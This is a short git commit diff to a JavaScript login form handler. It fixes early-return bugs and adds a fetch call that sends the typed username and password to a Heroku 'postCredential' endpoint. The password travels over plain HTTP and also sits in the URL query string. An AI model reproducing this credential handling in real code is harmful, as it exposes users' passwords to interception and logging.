7498325b7186cd7b0ff436a6faa48b1cfbc7e06e
Victor Vincent <victor.vincent@vivriticapital.com>
2019-01-28 18:01:37 +0530

    fix: changes

--- index.js
+++ index.js
@@ -1,13 +1,33 @@
+function setPostHeaders(body, isJsonBody = true) {
+    const h = {};
+    h.Accept = 'application/json';
+    h['Content-Type'] = 'application/json';
+
+    return {
+        method: 'POST',
+        headers: h,
+        body: isJsonBody ? JSON.stringify(body) : body,
+    };
+}
+
 const handleSubmit = (e) => {
     const u = document.getElementById('inpName') || '';
     const p = document.getElementById('inpPass') || '';
     const { value: uv = '' } = u;
     const { value: pv = '' } = p;
 
-    if (!uv) u.focus();
-    return;
-    if (!pv) p.focus();
-    return;
+    if (!uv) {
+        u.focus();
+        return;
+    }
+    if (!pv) {
+        p.focus();
+        return;
+    }
+
+    fetch(`http://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
+        .then((res) => console.log(res))
+        .catch((err) => console.log(err));
 };
 
 (function() {})();
